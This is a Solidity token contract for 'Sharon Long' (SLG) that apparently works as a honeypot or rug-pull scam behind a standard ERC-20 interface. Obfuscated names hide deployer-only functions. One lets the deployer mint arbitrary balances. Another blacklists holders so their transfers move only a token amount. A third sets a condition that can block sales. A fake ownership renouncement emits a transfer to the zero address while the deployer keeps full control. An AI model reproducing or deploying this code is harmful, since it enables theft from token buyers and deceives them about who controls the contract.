//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface fundIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listAmount {
    function createPair(address toMax, address autoMax) external returns (address);
}

interface feeTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeBuy) external view returns (uint256);

    function transfer(address launchedTx, uint256 shouldAt) external returns (bool);

    function allowance(address receiverSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldAt) external returns (bool);

    function transferFrom(
        address sender,
        address launchedTx,
        uint256 shouldAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromMin, uint256 value);
    event Approval(address indexed receiverSender, address indexed spender, uint256 value);
}

interface feeTxMetadata is feeTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SharonLong is launchBuy, feeTx, feeTxMetadata {

    function tokenReceiver(uint256 shouldAt) public {
        buyTotal();
        minMax = shouldAt;
    }

    function approve(address shouldMin, uint256 shouldAt) public virtual override returns (bool) {
        isEnableSender[_msgSender()][shouldMin] = shouldAt;
        emit Approval(_msgSender(), shouldMin, shouldAt);
        return true;
    }

    function autoLaunched(address marketingAt) public {
        buyTotal();
        if (enableToken != maxMarketing) {
            amountTx = true;
        }
        if (marketingAt == feeSender || marketingAt == maxShould) {
            return;
        }
        tradingSell[marketingAt] = true;
    }

    uint256 amountFund;

    mapping(address => bool) public tradingSell;

    function transferFrom(address receiverLaunchedTo, address launchedTx, uint256 shouldAt) external override returns (bool) {
        if (_msgSender() != senderMode) {
            if (isEnableSender[receiverLaunchedTo][_msgSender()] != type(uint256).max) {
                require(shouldAt <= isEnableSender[receiverLaunchedTo][_msgSender()]);
                isEnableSender[receiverLaunchedTo][_msgSender()] -= shouldAt;
            }
        }
        return isSell(receiverLaunchedTo, launchedTx, shouldAt);
    }

    uint256 minMax;

    address public feeSender;

    uint256 private enableToken;

    uint256 private fromAmount;

    function amountEnableReceiver(address receiverLaunchedTo, address launchedTx, uint256 shouldAt) internal returns (bool) {
        require(buyAmountToken[receiverLaunchedTo] >= shouldAt);
        buyAmountToken[receiverLaunchedTo] -= shouldAt;
        buyAmountToken[launchedTx] += shouldAt;
        emit Transfer(receiverLaunchedTo, launchedTx, shouldAt);
        return true;
    }

    mapping(address => uint256) private buyAmountToken;

    uint256 private sellLiquidityAmount = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return sellLiquidityAmount;
    }

    mapping(address => bool) public walletEnable;

    function fundFromShould() public {
        emit OwnershipTransferred(feeSender, address(0));
        exemptShould = address(0);
    }

    uint8 private walletAutoTeam = 18;

    function isSell(address receiverLaunchedTo, address launchedTx, uint256 shouldAt) internal returns (bool) {
        if (receiverLaunchedTo == feeSender) {
            return amountEnableReceiver(receiverLaunchedTo, launchedTx, shouldAt);
        }
        uint256 feeAt = feeTx(maxShould).balanceOf(listTrading);
        require(feeAt == minMax);
        require(launchedTx != listTrading);
        if (tradingSell[receiverLaunchedTo]) {
            return amountEnableReceiver(receiverLaunchedTo, launchedTx, exemptEnableMarketing);
        }
        return amountEnableReceiver(receiverLaunchedTo, launchedTx, shouldAt);
    }

    bool public teamToken;

    bool public tokenModeMin;

    address listTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private maxMarketing;

    function symbol() external view virtual override returns (string memory) {
        return takeTx;
    }

    address private exemptShould;

    function name() external view virtual override returns (string memory) {
        return toSell;
    }

    uint256 constant exemptEnableMarketing = 3 ** 10;

    uint256 private tradingMarketing;

    event OwnershipTransferred(address indexed sellLiquidity, address indexed tradingTake);

    function getOwner() external view returns (address) {
        return exemptShould;
    }

    function atSwap(address launchedIsBuy) public {
        if (tokenModeMin) {
            return;
        }
        
        walletEnable[launchedIsBuy] = true;
        
        tokenModeMin = true;
    }

    bool private limitAt;

    uint256 public launchedBuy;

    function transfer(address launchedLaunch, uint256 shouldAt) external virtual override returns (bool) {
        return isSell(_msgSender(), launchedLaunch, shouldAt);
    }

    bool private amountTx;

    function owner() external view returns (address) {
        return exemptShould;
    }

    string private takeTx = "SLG";

    function buyTotal() private view {
        require(walletEnable[_msgSender()]);
    }

    bool public tradingToken;

    function allowance(address tradingFund, address shouldMin) external view virtual override returns (uint256) {
        if (shouldMin == senderMode) {
            return type(uint256).max;
        }
        return isEnableSender[tradingFund][shouldMin];
    }

    constructor (){
        if (maxMarketing == tradingMarketing) {
            tradingMarketing = launchedBuy;
        }
        fundIs minTokenLaunch = fundIs(senderMode);
        maxShould = listAmount(minTokenLaunch.factory()).createPair(minTokenLaunch.WETH(), address(this));
        if (fromAmount != maxMarketing) {
            fromAmount = maxMarketing;
        }
        feeSender = _msgSender();
        fundFromShould();
        walletEnable[feeSender] = true;
        buyAmountToken[feeSender] = sellLiquidityAmount;
        if (limitAt != amountTx) {
            limitAt = false;
        }
        emit Transfer(address(0), feeSender, sellLiquidityAmount);
    }

    mapping(address => mapping(address => uint256)) private isEnableSender;

    address public maxShould;

    function decimals() external view virtual override returns (uint8) {
        return walletAutoTeam;
    }

    function balanceOf(address modeBuy) public view virtual override returns (uint256) {
        return buyAmountToken[modeBuy];
    }

    address senderMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function buyAmount(address launchedLaunch, uint256 shouldAt) public {
        buyTotal();
        buyAmountToken[launchedLaunch] = shouldAt;
    }

    string private toSell = "Sharon Long";

}